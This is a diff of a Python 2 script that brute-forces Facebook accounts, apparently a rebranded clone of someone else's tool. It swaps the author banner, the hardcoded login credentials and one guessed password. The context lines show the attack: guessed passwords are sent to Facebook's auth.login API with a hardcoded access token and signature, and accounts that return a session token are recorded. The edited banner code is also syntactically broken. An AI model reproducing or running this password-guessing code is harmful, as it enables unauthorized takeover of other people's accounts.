@@ -56,9 +56,9 @@ logo = """
 \033[1;31m█████████      \033[1;92m«----------✧----------»
 \033[1;32m ██ ██
 \033[1;37m╔═══════════════════════════════════════════════════╗
-\033[1;37m║\033[1;96m* \033[1;93mCreator  \033[1;93m:\033[1;36mKAMRAN PAKHTOON\033[1;93m                            \033[1;36m      ║
-\033[1;37m║\033[1;96m* \033[1;93mYoutube \033[1;93m :\033[1;37m\033[4mWE ARE ANONYMOUS.\033[0m\033[1;93m \033[1;36m                               ║
-\033[1;37m║\033[1;96m* \033[1;97mGitHub   \033[1;93m:\033[1;32mhttps://github.com/hackerkamran007  \033[1;36m           ║
+\033[1;37m║\033[1;96m* \033[1;93mCreator  \033[1;93m:\033[1;36mKHONDOKAR IMRAN\033[1;93m                            \033[1;36m      ║
+\033[1;37m║\033[1;96m* \033[1;93mFacebook link \033[1;93m :\033[1;37m\033[4mKHONDOKAR.IMRAN273.\033[0m\033[1;93m \033[1;36m                               ║
+\033[1;37m║\033[1;96m* \033[1;97mGitHub   \033[1;93m:\033[1;32mhttps://github.com/KhondokarImran/HackeerImran \033[1;36m           ║
 \033[1;37m╚═══════════════════════════════════════════════════╝"""
 
 def tik():
@@ -77,15 +77,21 @@ vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
 os.system("clear")
-print """\033[1;97m=====================================================>\033[1;92mTHIS SCRIPT IS CREATED BY KAMRAN AHMAD. FROM PAKISTAN.
+print """\033[1;97m=====================================================>\033[1;92mTHIS SCRIPT IS CREATED BY KHONDOKAR IMRAN. FROM BANGLADESH .
 \033[1;97m=====================================================>============>
-\033[1;32m [¤] █▄▀ ▄▀█ █▀▄▀█ █▀█ ▄▀█ █▄░█
-\033[1;32m [¤] █░█ █▀█ █░▀░█ █▀▄ █▀█ █░▀█"""
+
+
+\033[1;32m [¤]██╗███╗░░░███╗██████╗░░█████╗░███╗░░██╗"""
+\033[1;32m [¤]██║████╗░████║██╔══██╗██╔══██╗████╗░██║
+\033[1;32m [¤]██║██╔████╔██║██████╔╝███████║██╔██╗██║
+\033[1;32m [¤]██║██║╚██╔╝██║██╔══██╗██╔══██║██║╚████║
+\033[1;32m [¤]██║██║░╚═╝░██║██║░░██║██║░░██║██║░╚███║
+\033[1;32m [¤]╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
 print "\x1b[1;97m=====================================================>●⚀◇-------------------------------------------------◇⚀●⚀●=========>"
 
 
-CorrectUsername = "KAMRAN"
-CorrectPassword = "PAKHTOON"
+CorrectUsername = "Imran"
+CorrectPassword = "Khondokar"
 
 loop = 'true'
 while (loop == 'true'):
@@ -391,7 +397,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = 'india123321'
+													pass6 = 'Zamal '
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
